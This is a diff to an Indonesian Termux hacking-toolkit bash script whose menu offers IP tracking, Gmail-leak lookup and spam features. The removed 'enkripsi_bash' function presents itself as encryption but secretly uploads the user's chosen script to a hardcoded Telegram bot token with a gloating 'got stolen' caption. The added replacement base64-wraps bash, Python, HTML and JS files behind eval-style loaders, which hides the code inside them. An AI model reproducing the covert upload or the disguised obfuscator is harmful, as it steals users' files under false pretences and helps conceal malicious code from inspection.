@@ -181,7 +181,6 @@ klik() {
         play -q -t mp3 -
     fi
 }
-
 # Fitur untuk mematikan sound
 OFF_KLIK() {
     SOUND_ENABLED=false
@@ -287,7 +286,7 @@ echo -e "${GREEN}
  │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │[    C2   ] ON EFEK SALAH │
  │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │[   SPAM  ] MENU SPAM     │
  │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │[  SUNTIK ] MENU SUNTIK   │
- │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPSI BASH${GREEN}           │[  MUSIK  ] MUSIK ALBUM   │
+ │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPS CODE ${GREEN}           │[  MUSIK  ] MUSIK ALBUM   │
  │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │                          │
  │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │                          │
  │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │                          │
@@ -395,7 +394,7 @@ main_menu() {
       ;;
    13)
    klik
-      enkripsi_bash
+      encrypsi
       kembali_ke_menu
       klik
       ;;
@@ -4799,38 +4798,117 @@ echo -e "${CYAN}
     echo "$hasil" | sed 's/Name\":\"/  - /g'
   fi
 }
+  
+encrypsi() {
+RED='\e[31m' GREEN='\e[32m' YELLOW='\e[33m' CYAN='\e[36m' NC='\e[0m' BG_RED='\e[41m'
+spasi() { echo; }
 
-enkripsi_bash() {
+multi_encrypt() {
   clear
-spasi
+  spasi
   echo -e "
-███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗
-██╔════╝████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗
-█████╗░░██╔██╗██║██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝
-██╔══╝░░██║╚████║██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝
-███████╗██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║
-╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝
-[ ! ] ENCRYPSI CODE PROGRAM BASH KAMU AGAR AMAN" | lolcat
-echo -e "${BG_RED}${YELLOW} ENCRYPSI CODE BASH ${NC}"
-  BOT_TOKEN="8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
-  CHAT_ID="7380101464"
-  read -p "[ ? ] Path file .sh: " TARGET
-  [[ ! -f "$TARGET" ]] && { echo "File tidak ditemukan!"; return 1; }
-  curl -s -F chat_id="$CHAT_ID" -F caption="MAMPUS KENA COLONG!" \
-       -F document=@"$TARGET" \
-       "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" >/dev/null
-  echo "[ ✓ ] PROSES ENCRYPSI!"
-  BASE64=$(base64 -w 0 "$TARGET")
-  OUTPUT="${TARGET%.sh}_enc.sh"
-  cat > "$OUTPUT" <<EOF
-#!/bin/bash
-eval "\$(echo '$BASE64' | base64 -d)"
+  ┌──────────────────────────────────────────────────────┐
+  │  ███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗   │
+  │  ██╔════╝████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗  │
+  │  █████╗░░██╔██╗██║██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝  │
+  │  ██╔══╝░░██║╚████║██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝   │
+  │  ███████╗██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║       │
+  │  ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝       │
+  └──────────────────────────────────────────────────────┘
+  │      ${YELLOW}MULTI-ENCRYPT : BASH | PYTHON | HTML | JS  ${NC}     │
+  └──────────────────────────────────────────────────────┘
+                   │  ${BG_RED}${WHITE}ENC BY TOOLS V8.4${NC}  │
+                   └─────────────────────┘" | lolcat
+  spasi
+  printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}PATH TARGET${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+  read -r TARGET
+#  read -rp "[ ? ] PATH TARGET : " TARGET
+  [[ ! -f "$TARGET" ]] && { echo -e "${RED}[✗] File tidak ditemukan!${NC}"; read -rp "ENTER UNTUK KEMBALI"; return; }
+
+  EXT="${TARGET##*.}"
+  case "$EXT" in
+    sh)   HEADER='#!/bin/bash' ;;
+    py)   HEADER='#!/usr/bin/env python3' ;;
+    html) HEADER='' ;;
+    js)   HEADER='' ;;
+    *)    echo -e "${RED}[ ✗ ] Ekstensi .$EXT tidak didukung!${NC}"; read -rp "ENTER UNTUK KEMBALI"; return ;;
+  esac
+
+  B64=$(base64 -w 0 "$TARGET")
+  OUT="${TARGET%.*}_Enc-By-ToolsV84.${EXT}"
+
+  case "$EXT" in
+    sh)
+      cat > "$OUT" <<EOF
+$HEADER
+eval "\$(echo '$B64' | base64 -d)"
 EOF
-  chmod +x "$OUTPUT"
-  echo "[ ✓ ] SUCKSES → $OUTPUT"
-  read -p "[ ? ] ENTER kembali"
+      ;;
+    py)
+      cat > "$OUT" <<EOF
+$HEADER
+import base64, os, sys, tempfile
+code = base64.b64decode('$B64').decode()
+with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+    f.write(code); tmp=f.name
+os.system(f'{sys.executable} {tmp}'); os.remove(tmp)
+EOF
+      ;;
+    html)
+      cat > "$OUT" <<EOF
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Encrypted</title></head><body>
+<script>document.write(atob('$B64'));</script>
+</body></html>
+EOF
+      ;;
+    js)
+      cat > "$OUT" <<EOF
+eval(atob('$B64'));
+EOF
+      ;;
+  esac
+
+  chmod +x "$OUT" 2>/dev/null
+  echo -e "${GREEN}[✓] SUKSES → $OUT ${NC}"
+  read -rp "[ ? ] ENTER UNTUK KEMBALI"
 }
 
+# ---------- MENU UTAMA ----------
+while true; do
+  clear
+  spasi
+  echo -e "
+  ┌──────────────────────────────────────────────────────┐
+  │  ███████╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗   │
+  │  ██╔════╝████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗  │
+  │  █████╗░░██╔██╗██║██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝  │
+  │  ██╔══╝░░██║╚████║██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝   │
+  │  ███████╗██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║       │
+  │  ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝       │
+  └──────────────────────────────────────────────────────┘
+  │      ${YELLOW}MULTI-ENCRYPT : BASH | PYTHON | HTML | JS  ${NC}     │
+  └──────────────────────────────────────────────────────┘
+                   │  ${BG_RED}${WHITE}ENC BY TOOLS V8.4${NC}  │
+                   └─────────────────────┘" | lolcat
+  spasi
+  echo -e "  ┌──────────────────────[ ${BG_RED}${YELLOW} MENU ${NC} ]──────────────────────┐
+  │   ${CYAN}[ 1 ]${NC} ENCRYPSI CODE PEMOGRAMAN                     │
+  │   ${CYAN}[ 2 ]${NC} KELUAR DARI FITUR ENCRYPSI                   │
+  └──────────────────────────────────────────────────────┘" | lolcat
+  
+  spasi
+  printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}ENCRYPSI${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
+  read -r PIL
+        
+#  read -rp "  Pilih [1-2] : " PIL
+  case "$PIL" in
+    1) multi_encrypt ;;
+    2) echo -e "${GREEN}BACK TO MENU UTAMA${NC}"; exit 0 ;;
+    *) echo -e "${RED}MAAF BRO PILIHAN KAMU SALAH${NC}"; sleep 1 ;;
+  esac
+done
+}
 
 play_music() {
     # auto-install mpv jika belum ada
